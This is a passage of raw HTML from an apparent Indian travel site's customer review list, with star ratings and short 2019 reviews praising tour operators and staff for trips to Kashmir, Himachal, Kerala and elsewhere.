                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Sep 2019</small></h5>
                      <p style="margin:0px;">Gud service </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rajesh  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Aug 2019</small></h5>
                      <p style="margin:0px;">Good arrengment and well mantain trip<br />
    We have lots of fun  </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Abhinav dokania Dokania for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Aug 2019</small></h5>
                      <p style="margin:0px;">Very nice nd memorable trip thanks my trip my way </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kanchan Pal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Aug 2019</small></h5>
                      <p style="margin:0px;">Nice </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sushant  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Aug 2019</small></h5>
                      <p style="margin:0px;">It was a awesome trip ,the guy Mr Hitesh was very much co operative throught the trip .on a stage due to weather issue we had to rescheduled the preapproved plan ,but Hitesh managed very well.<br />
     Some of the minor lagging point like<br />
    Vehicle driver was not that aware of local sightseeing guide,which i believe in future they ll arrange such driver who can also do the tourist  guide job as well.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mayank  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Aug 2019</small></h5>
                      <p style="margin:0px;">Its really good trip of Himachal through Nature star in. The service is Very better provide by nature star in and hotel. But due to heavy rain in Himachal Pradesh I missed to visit Rohtang pass. And due to landslide and heavy rain all roads has blocked. And therefore we have stay two more days in manali. Now finally on 21st I have leave from Manali.Especially Meera Mam has good support to me in this situation. Once again thank you so much nature star in.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Pahuni  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Aug 2019</small></h5>
                      <p style="margin:0px;">We booked our trip to kashmir with Honor tour and travel for 6 days and I must say they made our whole trip so comfortable. Food, accommodation, travel everything was so good, they treated us like a family.<br />
    I highly recommend honor tour and travel. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Anit  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Jul 2019</small></h5>
                      <p style="margin:0px;">The trip was well planned by Twilight Tours and travels and I really enjoyed the trip. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dheeraj  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jul 2019</small></h5>
                      <p style="margin:0px;">Good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prateek   for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Jul 2019</small></h5>
                      <p style="margin:0px;">Unforgettable trip. I love it. I hope I'll come again. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Tapesh  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Jul 2019</small></h5>
                      <p style="margin:0px;">Very helpful with the tour and even flexiable with the bookings too ..really was pleased by the service and the way they treat their coustmers is awesome </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Abid  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Jul 2019</small></h5>
                      <p style="margin:0px;">Very well organized trip. Pocket friendly also.<br />
    They will provide you complete itinerary,travel and stay is well taken care of. Professional driver is assigned for cab travels. Highly recommended .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Chandrashekar  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Jul 2019</small></h5>
                      <p style="margin:0px;">Good service </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from pradeep  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Jul 2019</small></h5>
                      <p style="margin:0px;">Best</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sanjay  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Jul 2019</small></h5>
                      <p style="margin:0px;">Fantastic Trip organised by Yes Tourism <br />
    Full support and always available for the help required <br />
    planning my next trip through them only</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Raqueeb  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Jul 2019</small></h5>
                      <p style="margin:0px;">HI ,<br />
    Enjoyed my trip to kashmir, thanks to the hospitality of Ahlan tours and travels. They have a wonderful and friendly staff specially Waseem and Kifayat. Hope i will have my next trip to kahmir with this team for sure. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from R Lal  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Jul 2019</small></h5>
                      <p style="margin:0px;">Our Kashmir tour was marvelous, fantastic and hospitality extended by Driver, Mr. Feeroz was extremely well. The services of Flora Tour and Travels were fantastic, especially Mr Shariq Bhat has coordinated my hotel bookings in a very professional and amicable manner. I want to give him full marks towards his handling and extending services to the customer very well. The entire trip was excellent and services of tour operator including vehicle driver were very good.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Tejas  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Jul 2019</small></h5>
                      <p style="margin:0px;">Very good guys, reliable, reasonable & comitted. Mr Sajjad & Ms Fozia Ã°ÂŸÂ‘Â</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mohd Sharif  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Jul 2019</small></h5>
                      <p style="margin:0px;">Very good experience with overseas holidays package. We felt free at kashmir with package. Mr.Aamir Shah provided a good service.Thanks for all that.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sonali Jain  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">The trip was amazing and the executives were too cooperative.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Apoorv  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">Excellent service and co-ordial staff the entire trip with my family was a memorable one. Thanks to Jabbar travels cost effective and trustworthy. Special thanks to fozia for keeping in continuous touch with us before and throughout our trip.<br />
    Three cheers to Jabbar tours and travels.<br />
    Will be coming back soon.<br />
    A must go to kashmir trip through Jabbar travels specially.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shardul Kadam  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">Thanks to Fozia from jabar tour & travels, had a great trip and enjoyed a lot. The stay & food was good. Great hospitality by our driver. The only thing that made a negative impact was no sim cards provided resulting in no communication with parents, also no interest services. In future would  love  to travel  with jabar tours & travels and definitely recommend it to our friends :)<br />
    Thank you </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from yogender   for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">It was A well managed trip. The driver cum guide cum manager was wonderful. Stay at Havloc was best but other places were also very good. Overall the place the people the management of tour and the tour guides were all wonderful. Thanks</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vandana  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">Awesome And wonderful experience ....just Srinagar hotel  and services could have been better</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manoj  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jul 2019</small></h5>
                      <p style="margin:0px;">Our trip to Kashmir was fantastic and was well organised and coordinated by white fox travels. We were so concerned before the trip about safety but on the ground there is all love peace and natural beauty. All places we visited were real natural beauty boat house stay and travel was so memorable. We will definitely plan our next trip with White fox   </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Simanta  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">Maja aya</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from HIREN JADHAV  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">Awesome Management, Good Service Provider, Very Helpful At Each And Every Moment Of The Trip, Shimla Manali Trip Was One Of My Memorable Trip Just Because Of Himalayas Expedition.<br />
    Keep It Up.<br />
    I Hope U Serve This Type Of Service To Each And Every Person Or Family And All The Very Best For Future.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mohammad furqan   for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">Honor tour and travel company is very good and staff is very helpful and gentle. Mr. umar is very kind person</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sanjay B Udar for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">Best ...I will come again</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from tarun  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">VERY GOOD & RESPONSIBLE TEAM , THANK YOU </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Hemal Patel for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">The Himalayas Expedition (Mohit Thakur) arrange my Himachal trip is very Good And problem in Journey. All Services are best.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Aishwarya Roy for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jul 2019</small></h5>
                      <p style="margin:0px;">I booked the package from travel setu throgh Darshan. They provided a really good package. I enjoyed a lot. And Munnar is beautiful. <br />
    Thanks Travel Setu.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mousumi  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Jun 2019</small></h5>
                      <p style="margin:0px;">We had a wonderful trip to kashmir with jabbar tour n travels. Hotels provided were also good. Vehicle was good and driver was very  much friendly n helpful. I must mention his name Imran khan , very good person by heart. And offcourse Fozia mam who has arranged everything for us. Thank u Jabbar tour n travels. We had a great stay at kashmir...</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manju  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Jun 2019</small></h5>
                      <p style="margin:0px;">It was an unforgettable trip by all means! Kashmir is almost every Indian's dream destination and it should definitely be accomplished. I would suggest Jabbar tours and travels to anyone who plans a Kashmir trip. All arrangements were perfect and professional, especially Fozia, their staff, was always there at our service throughout the trip. We, all the three families really enjoyed the whole trip. Thanks to Jabbar tours n travels and Fozia, for making our dream come true.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Darryl Pinto  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Jun 2019</small></h5>
                      <p style="margin:0px;">I had been for 6 nights with wife, two daughters n my senior citizen parents. Too good arrangements....five star treatment .....good hotels, food and driver. Fozia from the tour operators offic, drivers tajamul and nazir are highly recommended....thanks a ton....</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Atul  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2019</small></h5>
                      <p style="margin:0px;">Very good service By travelsetu.com.  Highly recommended to all.  </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rohit  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2019</small></h5>
                      <p style="margin:0px;">This trip is very fantastic and i lot of fun in this trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from mukul  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2019</small></h5>
                      <p style="margin:0px;">Jagdish ji's behavior was very good during the whole trip & very good communication to start to end. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Noman khan  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2019</small></h5>
                      <p style="margin:0px;">The name surely says it all. Recommended by a friend to go ahead and book with them and they surely lived up to their reputation. Quite literally the best travel experience you can get of the country. Mr Hitesh & Rakesh was always helpful and available for any query youâ€™d throw at him. This enhanced our experience all the more. Dharminder our driver cum guide was extremely patient, supportive and well mannered as well. He allowed us to enjoy the beauty of every location we visited without any fuss and also guided us on things we should or shouldnâ€™t do. <br />
    Overall a splendid experience thanks to Mr Hitesh and his wonderful team. <br />
    <br />
    Great job!!</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Balwant Ninama   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2019</small></h5>
                      <p style="margin:0px;">Best travels by my trip my way </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from sagar chaudhari for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jun 2019</small></h5>
                      <p style="margin:0px;">I booked my family trip for himachal. Everything was planned and managed perfectly. Staff was very kind and always guides as well as takes the status for safety while we were on trip. Booked hotels and car driver, every service was funtastic. I would recommend this travel agency to anyone for amazing trips. <br />
    5 out of 5. <br />
    Thank you for such a good service. I will definately look for you for my next trip Ã°ÂŸÂ˜ÂŠ. My family is very happy and got great memories because of you. Keep up good work.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Neeraj Gupta  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jun 2019</small></h5>
                      <p style="margin:0px;">Great experience and good support booked a tour for dalhousie and dharamshala. Hotels they provided are good and also the cab driver is very friendly and understand the route well. <br />
    Overall experience is good.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Viral  for Thailand trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Jun 2019</small></h5>
                      <p style="margin:0px;">Best </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from pappu kumar  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Jun 2019</small></h5>
                      <p style="margin:0px;">Kashmir is one of the most memorable trips organized by Jabbar Tour and Travels. Fozia did an amazing job in providing the best of the service to us, a very good experience among the family, well organized with good coordination,Good nature Of driver and Taxi condition. I wish all the success for Jabbar Tour and Travels,<br />
    I will came again with my family. Thanks</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Raju charaniya  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Jun 2019</small></h5>
                      <p style="margin:0px;">BEST AND AFFORDABLE COMPANY.<br />
    HIGH LEVEL OF WORK ETHICS AND TRANSPARENT.<br />
    OFFERED EVERYTHING, WORTH ITS COST.<br />
    SUPERB EXPERIENCE, THANK YOU!</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Tarun Kumar  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jun 2019</small></h5>
                      <p style="margin:0px;">Very good helpful & Journey in budget package... </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Alagesan  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, May 2019</small></h5>
                      <p style="margin:0px;">Best package disigned by yes tourisum india.  Highly recommanded to all</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from NITIN VASANT MODAK  for Bhutan trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, May 2019</small></h5>
                      <p style="margin:0px;">Very good service .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from sanjay kumar  for South-India trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, May 2019</small></h5>
                      <p style="margin:0px;">excellent</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Santosh  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
